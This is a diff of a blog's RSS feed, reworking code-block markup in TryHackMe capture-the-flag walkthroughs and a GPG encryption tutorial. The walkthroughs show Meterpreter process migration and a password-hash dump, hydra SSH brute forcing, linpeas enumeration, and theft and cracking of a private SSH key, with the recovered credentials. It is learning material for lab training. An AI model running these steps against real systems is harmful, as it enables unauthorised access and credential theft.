+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><ul>
 <li>Looking up processes on the machine and found that this one seemed interesting.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
-
----   ----  ----                  ----  -------  ----                          ----
- <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">608</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           -
-C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---   ----  ----                  ----  -------  ----                          ----
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">608</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           -
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
+</span></span></code></pre></div><ul>
 <li>Then I migrated to <strong>winlogon.exe</strong> and was able to dump the password hashes on the system.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; migrate -P <span style="color:#ae81ff">668</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">748</span> to 668...
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
-meterpreter &gt; 
-
-meterpreter &gt; hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-</code></pre></div><h1 id="heading-5"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; migrate -P <span style="color:#ae81ff">668</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">748</span> to 668...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; hashdump
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</span></span></code></pre></div><h1 id="heading-5"></h1>
 <h2 id="cracking">Cracking</h2>
 <ul>
 <li>
@@ -235,32 +422,32 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 <ul>
 <li>Was able to login as Jon then started looking for flags.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; search -f flag*.txt
-Found <span style="color:#ae81ff">3</span> results...
-    c:<span style="color:#ae81ff">\f</span>lag1.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">24</span> bytes<span style="color:#f92672">)</span>
-    c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">37</span> bytes<span style="color:#f92672">)</span>
-    c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">34</span> bytes<span style="color:#f92672">)</span>
-</code></pre></div><h1 id="heading-6"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f flag*.txt
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">3</span> results...
+</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\f</span>lag1.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">24</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">37</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">34</span> bytes<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h1 id="heading-6"></h1>
 <h2 id="searching-for-flags">Searching for flags</h2>
 <ul>
 <li>Found flag1 by going to root C: drive and ls and catting flag1.txt</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">flag<span style="color:#f92672">{</span>access_the_machine<span style="color:#f92672">}</span>
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>access_the_machine<span style="color:#f92672">}</span>
+</span></span></code></pre></div><ul>
 <li>Found flag2 looking for Windows Sam Config</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:/Windows/System32/config
-
-ls
-
-cat flag2.txt
-flag<span style="color:#f92672">{</span>sam_database_elevated_access<span style="color:#f92672">}</span>
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:/Windows/System32/config
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat flag2.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>sam_database_elevated_access<span style="color:#f92672">}</span>
+</span></span></code></pre></div><ul>
 <li>Found flag3 in Jon&rsquo;s Documents folder.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; cat c:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\\</span>Jon<span style="color:#ae81ff">\\</span>Documents<span style="color:#ae81ff">\\</span>flag3.txt
-flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
-</code></pre></div><h1 id="heading-7"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cat c:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\\</span>Jon<span style="color:#ae81ff">\\</span>Documents<span style="color:#ae81ff">\\</span>flag3.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="heading-7"></h1>
 <h1 id="heading-8"></h1>
 <p><em>written and performed by jb williams</em></p>
 ]]></content>
@@ -274,13 +461,13 @@ flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span sty
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/09/thm_basic_pentest_walkthrough/</guid>
             <description>Basic PenTesting Box Facilitated by TryHackMe
 Performed, Written &amp;amp; Compiled by Jb Williams - @_binford - Github
-Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
-  Username (jan and kay found via enum4linux).
-  Password(jan:armando found via hydra with ssh).
-  Private SSH Key found with Linpeas.
-  Cracked SSH Key
-  Was able to login and read pass.bak
-     User Pass Service SSH Key IP Port     jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.</description>
+Summary Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
+Username (jan and kay found via enum4linux).
+Password(jan:armando found via hydra with ssh).
+Private SSH Key found with Linpeas.
+Cracked SSH Key
+Was able to login and read pass.bak
+User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.10.62.206 22 kay beeswax ssh kay_id_rsa 10.</description>
             <content type="html"><![CDATA[<h1 id="basic-pentesting-box">Basic PenTesting Box</h1>
 <p>Facilitated by <a href="https://tryhackme.com/hacktivities">TryHackMe</a></p>
 <p>Performed, Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">Github</a></p>
@@ -374,18 +561,18 @@ Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp
 <li>Scanned Machine on the network:</li>
 </ul>
 <p><strong>IP:</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.62.206
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.10.62.206
+</span></span></code></pre></div><ul>
 <li>Discovered these ports and services running on the device.</li>
 </ul>
 <p><strong>Ports:</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">22</span> - ssh 7.2
-<span style="color:#ae81ff">80</span> - apache 2.4.18
-<span style="color:#ae81ff">139</span> - SMB 3.X - 4.X
-<span style="color:#ae81ff">445</span> - SMB 4.3.11
-8009- Apache Jserv 1.3
-<span style="color:#ae81ff">8080</span> Apache tomcat 9.0.7
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">22</span> - ssh 7.2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span> - apache 2.4.18
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span> - SMB 3.X - 4.X
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span> - SMB 4.3.11
+</span></span><span style="display:flex;"><span>8009- Apache Jserv 1.3
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8080</span> Apache tomcat 9.0.7
+</span></span></code></pre></div><ul>
 <li>
 <p>Began enumeration on the webpage on port 80 with Dirbuster:</p>
 </li>
@@ -393,12 +580,12 @@ Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp
 <p>Discovered:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/development/*
-
-/development/dev.txt
-
-/development/j.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/development/*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/development/dev.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/development/j.txt
+</span></span></code></pre></div><ul>
 <li>
 <p><code>/development/dev.txt</code> talks about <code>Apache Struts 2.5.12</code>, as well as initials of what I assume are employees:</p>
 <ul>
@@ -413,8 +600,8 @@ Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp
 <ul>
 <li>Ran enum4linux on the target IP, splitting the output to STDOUT and a file:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">enum4linux -a 10.10.62.206 | tee -a enum4linux.log
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum4linux -a 10.10.62.206 | tee -a enum4linux.log
+</span></span></code></pre></div><ul>
 <li>
 <p>Enum4linux found the full usernames <code>Kay</code> and <code>Jan</code>:</p>
 </li>
@@ -422,8 +609,8 @@ Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp
 <p>Bruteforced ssh to find <code>Jan's</code> password:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://10.10.62.206
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://10.10.62.206
+</span></span></code></pre></div><ul>
 <li>Credentials that were Found:</li>
 </ul>
 <table>
@@ -464,26 +651,26 @@ Summary   Hidden directory on webserver(development, found via dirbuster&amp;amp
 <p>From my host, I used ssh to transfer Linpeas to the Machine into the shared memory:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">scp /opt/linpeas/linpeas.sh jan@10.10.62:/dev/shm
-
-ssh jan@10.10.62.206
-
-chmod +x linpeas.sh <span style="color:#f92672">&amp;&amp;</span> ./linpeas.sh | tee linlog.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp /opt/linpeas/linpeas.sh jan@10.10.62:/dev/shm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssh jan@10.10.62.206
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x linpeas.sh <span style="color:#f92672">&amp;&amp;</span> ./linpeas.sh | tee linlog.txt
+</span></span></code></pre></div><ul>
 <li>This enumeration brought me to Kay&rsquo;s Private SSH key that I was able to read.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/home/kay/.ssh/id_rsa
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/kay/.ssh/id_rsa
+</span></span></code></pre></div><ul>
 <li>I copied to my host and changed the permissions on it.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> kay_id_rsa
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> kay_id_rsa
+</span></span></code></pre></div><ul>
 <li>Discovered the SSH Key was password protected, so I sent it to <code>ssh2john</code>, out put it into a text doc to then run <code>john</code> on it.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /usr/share/john/ssh2john.py kay_id_rsa &gt; forjohn.txt
-
-john forjohn.txt
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 /usr/share/john/ssh2john.py kay_id_rsa &gt; forjohn.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>john forjohn.txt
+</span></span></code></pre></div><ul>
 <li>
 <p>John found <code>kay's</code> password: <code>beeswax</code></p>
 </li>
@@ -491,9 +678,9 @@ john forjohn.txt
 <p>SSH&rsquo;d into the machine as <code>Kay</code>:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i kay_id_rsa kay@10.10.62.206
-beeswax
-</code></pre></div><table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i kay_id_rsa kay@10.10.62.206
+</span></span><span style="display:flex;"><span>beeswax
+</span></span></code></pre></div><table>
 <thead>
 <tr>
 <th>User</th>
@@ -518,12 +705,12 @@ beeswax
 <ul>
 <li>As <code>Kay</code> I was able to read that <code>pass.bak</code> file:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat pass.bak
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat pass.bak
+</span></span></code></pre></div><ul>
 <li>With that I was able to find the Password/Last Flag:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">heresareallystrongpasswordthatfollowsthepasswordpolicy$$
-</code></pre></div><h1 id="heading"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+</span></span></code></pre></div><h1 id="heading"></h1>
 <p>performed, written &amp; compiled by jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></p>
 ]]></content>
         </item>
@@ -535,11 +722,11 @@ beeswax
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2022/08/gpg/</guid>
             <description>GPG Written &amp;amp; Compiled by Jb Williams - @_binford - Github
- GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.
+GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.
 A quick walkthrough of GPG.
 Works on most all OS&amp;rsquo;s, this will be a Linux, and quick Windows walkthrough.
 Public/Private Keys:
- You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone). You give you Public Key out to anyone.</description>
+You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone). You give you Public Key out to anyone.</description>
             <content type="html"><![CDATA[<h1 id="gpg">GPG</h1>
 <p>Written &amp; Compiled by Jb Williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams/Bash_Projects/tree/main/GPG">Github</a></p>
 <h1 id="heading"></h1>
@@ -571,8 +758,8 @@ Public/Private Keys:
 <ul>
 <li>To create a Public/Private Key, Charles will enter the following command:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --full-gen-key
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --full-gen-key
+</span></span></code></pre></div><ul>
 <li>
 <p>Next, Charles will be asked to enter the following info:</p>
 <ul>
@@ -597,26 +784,26 @@ Public/Private Keys:
 <p>Example Output:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg: key D81710193A5FC56A marked as ultimately trusted
-gpg: directory <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d&#39;</span> created
-gpg: revocation certificate stored as <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d/C4A3CFC-
-</span><span style="color:#e6db74">51a
-</span><span style="color:#e6db74">B1318FFD4D2C291D81710193A5FC56A.rev&#39;</span>
-public and secret key created and signed
-</code></pre></div><ul>
-<li>To verify the keys were created you can use this command:(returns all keys in Charles' keyring.</li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg: key D81710193A5FC56A marked as ultimately trusted
+</span></span><span style="display:flex;"><span>gpg: directory <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d&#39;</span> created
+</span></span><span style="display:flex;"><span>gpg: revocation certificate stored as <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d/C4A3CFC-
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">51a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">B1318FFD4D2C291D81710193A5FC56A.rev&#39;</span>
+</span></span><span style="display:flex;"><span>public and secret key created and signed
+</span></span></code></pre></div><ul>
+<li>To verify the keys were created you can use this command:(returns all keys in Charles&rsquo; keyring.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --list-keys
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --list-keys
+</span></span></code></pre></div><ul>
 <li>Example Output:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/home/charles/.gnupg/pubring.kbx
------------------------------------
-pub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
-C4A3CFC51B1318FFD4D2C291D81710193A5FC56A
-uid           <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> charles &lt;charles@email.com&gt;
-sub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
-</code></pre></div><h2 id="step-2-exporting-and-importing-keys">Step 2: Exporting and Importing Keys</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/charles/.gnupg/pubring.kbx
+</span></span><span style="display:flex;"><span>-----------------------------------
+</span></span><span style="display:flex;"><span>pub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>C4A3CFC51B1318FFD4D2C291D81710193A5FC56A
+</span></span><span style="display:flex;"><span>uid           <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> charles &lt;charles@email.com&gt;
+</span></span><span style="display:flex;"><span>sub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="step-2-exporting-and-importing-keys">Step 2: Exporting and Importing Keys</h2>
 <p>  The person sending a message needs the receiver&rsquo;s Public Key to encrypt the message for them. Charles will need to export his Public Key to make it Public, so others like Jack can use it.</p>
 <ul>
 <li>
@@ -626,8 +813,8 @@ sub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>E<span style="color
 <p>Charles would use the following command to export his Public Key:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gpg --armor --output charles.gpg --export charles@email.com
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --armor --output charles.gpg --export charles@email.com
+</span></span></code></pre></div><ul>
 <li>
 <p><code>gpg</code>: The command to run GPG.</p>
 </li>
@@ -644,51 +831,51 @@ sub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>E<span style="color
 <p>To view the exported key, in the folder you exported it:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat charles.gpg
-</code></pre></div><p>Example Output(shortened):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-----BEGIN PGP PUBLIC KEY BLOCK-----
-
-oCN2AghQUDgu5yBVAmPAx7hatvcMBR1X6NqJN4wStLB21OvHdgT2VbiHUtwkGvbJ
-Hsui9eTR7bBY1YgP8PcGFjeMZ5+C7E94uYeksbwMzFWGE79M3kqEi1tgkDZTN/T8
-8O31qQUgDCCbUnuvpW5pYJ2BconeNBHAZNKSKg+9U3DfCazRpky89be6W7WtjDGs
-iFo5PEjBTvCJJXHvDgn2W7I7U0MWO220gyCT/Ja/eKad5GKTeMjOC4ERTwvha0ON 
------END PGP PUBLIC KEY BLOCK-----
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat charles.gpg
+</span></span></code></pre></div><p>Example Output(shortened):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PGP PUBLIC KEY BLOCK-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>oCN2AghQUDgu5yBVAmPAx7hatvcMBR1X6NqJN4wStLB21OvHdgT2VbiHUtwkGvbJ
+</span></span><span style="display:flex;"><span>Hsui9eTR7bBY1YgP8PcGFjeMZ5+C7E94uYeksbwMzFWGE79M3kqEi1tgkDZTN/T8
